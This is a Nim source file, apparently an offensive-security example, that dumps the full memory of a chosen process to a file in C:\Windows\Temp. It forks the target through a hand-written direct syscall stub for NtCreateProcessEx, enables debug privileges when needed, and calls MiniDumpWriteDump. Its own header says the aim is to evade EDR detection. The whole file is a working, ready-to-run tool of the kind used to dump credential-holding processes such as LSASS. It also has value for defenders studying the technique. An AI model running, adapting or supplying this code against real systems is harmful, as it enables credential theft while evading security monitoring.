#[

    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause

    This (ab)uses Window's implementation of Fork() and acquires a handle to a remote process using the PROCESS_CREATE_PROCESS access right potentially allowing to evade EDR detectons.

    This example uses MiniDumpWriteDump() to dump the forked processes memory after acquiring it's handle.
    See the blogpost in the references below for a full write-up.

    References:
        - https://billdemirkapi.me/abusing-windows-implementation-of-fork-for-stealthy-memory-operations/
        - https://github.com/D4stiny/ForkPlayground
]#

from os import paramStr, commandLineParams
from system import quit, newException
from strutils import parseInt
import strformat
import winim/lean

{.passC:"-masm=intel".}

type
    FunctionCallException = object of CatchableError
    MINIDUMP_TYPE = enum
        MiniDumpWithFullMemory = 0x00000002

# Syscall generated using NimlineWhispers (https://github.com/ajpc500/NimlineWhispers)
proc NtCreateProcessEx*(
    ProcessHandle: PHANDLE, 
    DesiredAccess: ACCESS_MASK, 
    ObjectAttributes: POBJECT_ATTRIBUTES, 
    ParentProcess: HANDLE, 
    Flags: ULONG, 
    SectionHandle: HANDLE, 
    DebugPort: HANDLE, 
    ExceptionPort: HANDLE, 
    JobMemberLevel: ULONG
): NTSTATUS {.asmNoStackFrame.} =

    asm """
	mov rax, gs:[0x60]                       
NtCreateProcessEx_Check_X_X_XXXX:               
	cmp dword ptr [rax+0x118], 6
	je  NtCreateProcessEx_Check_6_X_XXXX
	cmp dword ptr [rax+0x118], 10
	je  NtCreateProcessEx_Check_10_0_XXXX
	jmp NtCreateProcessEx_SystemCall_Unknown
NtCreateProcessEx_Check_6_X_XXXX:               
	cmp dword ptr [rax+0x11c], 1
	je  NtCreateProcessEx_Check_6_1_XXXX
	cmp dword ptr [rax+0x11c], 2
	je  NtCreateProcessEx_SystemCall_6_2_XXXX
	cmp dword ptr [rax+0x11c], 3
	je  NtCreateProcessEx_SystemCall_6_3_XXXX
	jmp NtCreateProcessEx_SystemCall_Unknown
NtCreateProcessEx_Check_6_1_XXXX:               
	cmp word ptr [rax+0x120], 7600
	je  NtCreateProcessEx_SystemCall_6_1_7600
	cmp word ptr [rax+0x120], 7601
	je  NtCreateProcessEx_SystemCall_6_1_7601
	jmp NtCreateProcessEx_SystemCall_Unknown
NtCreateProcessEx_Check_10_0_XXXX:              
	cmp word ptr [rax+0x120], 10240
	je  NtCreateProcessEx_SystemCall_10_0_10240
	cmp word ptr [rax+0x120], 10586
	je  NtCreateProcessEx_SystemCall_10_0_10586
	cmp word ptr [rax+0x120], 14393
	je  NtCreateProcessEx_SystemCall_10_0_14393
	cmp word ptr [rax+0x120], 15063
	je  NtCreateProcessEx_SystemCall_10_0_15063
	cmp word ptr [rax+0x120], 16299
	je  NtCreateProcessEx_SystemCall_10_0_16299
	cmp word ptr [rax+0x120], 17134
	je  NtCreateProcessEx_SystemCall_10_0_17134
	cmp word ptr [rax+0x120], 17763
	je  NtCreateProcessEx_SystemCall_10_0_17763
	cmp word ptr [rax+0x120], 18362
	je  NtCreateProcessEx_SystemCall_10_0_18362
	cmp word ptr [rax+0x120], 18363
	je  NtCreateProcessEx_SystemCall_10_0_18363
	cmp word ptr [rax+0x120], 19041
	je  NtCreateProcessEx_SystemCall_10_0_19041
	cmp word ptr [rax+0x120], 19042
	je  NtCreateProcessEx_SystemCall_10_0_19042
	cmp word ptr [rax+0x120], 19043
	je  NtCreateProcessEx_SystemCall_10_0_19043
	jmp NtCreateProcessEx_SystemCall_Unknown
NtCreateProcessEx_SystemCall_6_1_7600:          
	mov eax, 0x004a
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_6_1_7601:          
	mov eax, 0x004a
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_6_2_XXXX:          
	mov eax, 0x004b
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_6_3_XXXX:          
	mov eax, 0x004c
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_10_0_10240:        
	mov eax, 0x004d
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_10_0_10586:        
	mov eax, 0x004d
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_10_0_14393:        
	mov eax, 0x004d
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_10_0_15063:        
	mov eax, 0x004d
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_10_0_16299:        
	mov eax, 0x004d
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_10_0_17134:        
	mov eax, 0x004d
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_10_0_17763:        
	mov eax, 0x004d
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_10_0_18362:        
	mov eax, 0x004d
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_10_0_18363:        
	mov eax, 0x004d
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_10_0_19041:        
	mov eax, 0x004d
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_10_0_19042:        
	mov eax, 0x004d
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_10_0_19043:        
	mov eax, 0x004d
	jmp NtCreateProcessEx_Epilogue
NtCreateProcessEx_SystemCall_Unknown:           
	ret
NtCreateProcessEx_Epilogue:
	mov r10, rcx
	syscall
	ret
    """

proc MiniDumpWriteDump(
    hProcess: HANDLE,
    ProcessId: DWORD, 
    hFile: HANDLE, 
    DumpType: MINIDUMP_TYPE, 
    ExceptionParam: INT, 
    UserStreamParam: INT,
    CallbackParam: INT
): BOOL {.importc: "MiniDumpWriteDump", dynlib: "dbghelp", stdcall.}

proc cleanSnapshot(currentSnapshotProcess: HANDLE): BOOL =
    result = TRUE

    result = TerminateProcess(currentSnapshotProcess, 0)
    CloseHandle(currentSnapshotProcess)
    if result == FALSE:
        echo fmt"Failed to terminate process {GetProcessId(currentSnapshotProcess)} [Error: {GetLastError()}]"

proc forkSnapshot(targetProcessId: DWORD): HANDLE =
    result = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetProcessId)
    if result == FALSE:
        echo fmt"Failed to open a PROCESS_CREATE_PROCESS handle to target process {targetProcessId} [Error: {GetLastError()}]"
        raise newException(FunctionCallException, "OpenProcess() failed")

proc takeSnapshot(targetProcessId: DWORD): HANDLE =
    var 
        currentSnapshotProcess: HANDLE
        status: NTSTATUS
        targetProcess: HANDLE = forkSnapshot(targetProcessId)

    status = NtCreateProcessEx(
        addr currentSnapshotProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        targetProcess,
        0,
        0,
        0,
        0,
        0
    )

    if NT_SUCCESS(status) == FALSE:
        echo fmt"Failed to create fork process for target {targetProcessId} [Error: {GetLastError()}]"
        raise newException(FunctionCallException, "NtCreateProcessEx() failed")

    return currentSnapshotProcess

proc setDebugPrivs(): bool = 
    var
        currentToken: HANDLE
        currentDebugValue: LUID
        newTokenPrivs: TOKEN_PRIVILEGES
        adjustSuccess: WINBOOL

    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr currentToken) == FALSE:
        echo fmt"Failed to open current process token [Error: {GetLastError()}]"
        return false

    if LookupPrivilegeValue(NULL, SE_DEBUG_NAME, addr currentDebugValue) == FALSE:
        echo fmt"Failed to lookup current debug privilege [Error: {GetLastError()}]"
        CloseHandle(currentToken)
        return false

    newTokenPrivs.PrivilegeCount = 1
    newTokenPrivs.Privileges[0].Luid = currentDebugValue
    newTokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

    adjustSuccess = AdjustTokenPrivileges(
        currentToken,
        FALSE, 
        addr newTokenPrivs, 
        cast[DWORD](sizeof(newTokenPrivs)), 
        NULL, 
        NULL
    )

    if adjustSuccess == FALSE or GetLastError() != ERROR_SUCCESS:
        echo fmt"Failed to set debug privileges on current process [Error: {GetLastError()}]"
        CloseHandle(currentToken)
        return false

    echo "Successfully set debug privs on current process"
    return true

when isMainModule:
    if len(commandLineParams()) == 0:
        echo "Usage: fork_dump.exe [target process ID]"
        quit(1)

    var 
        snapshotProcess: HANDLE
        dumpFileName: string = r"C:\Windows\Temp\test.dump"
        dumpFile: File
        dumpSuccess: BOOL
        adjustedPrivSuccess: bool
        targetProcessId: DWORD = cast[DWORD](parseInt(paramStr(1)))

    echo "targetProcessId: ", targetProcessId
    dumpfile = open(dumpFileName, fmWrite)

    try:
        snapshotProcess = takeSnapshot(targetProcessId)
    except FunctionCallException:
        echo "Forking process failed, setting debug privileges and re-trying"
        adjustedPrivSuccess = setDebugPrivs()
        snapshotProcess = takeSnapshot(targetProcessId)

    dumpSuccess = MiniDumpWriteDump(
        snapshotProcess, 
        GetProcessId(snapshotProcess), 
        dumpfile.getOsFileHandle(), 
        MiniDumpWithFullMemory, 
        0,
        0,
        0
    )

    if dumpSuccess == TRUE:
        echo fmt"Successfully dumped forked process {targetProcessId} to {dumpFileName}!"
    else:
        echo fmt"Failed to create dump of forked process [Error: {GetLastError()}]"

    dumpFile.close()
    discard cleanSnapshot(snapshotProcess)
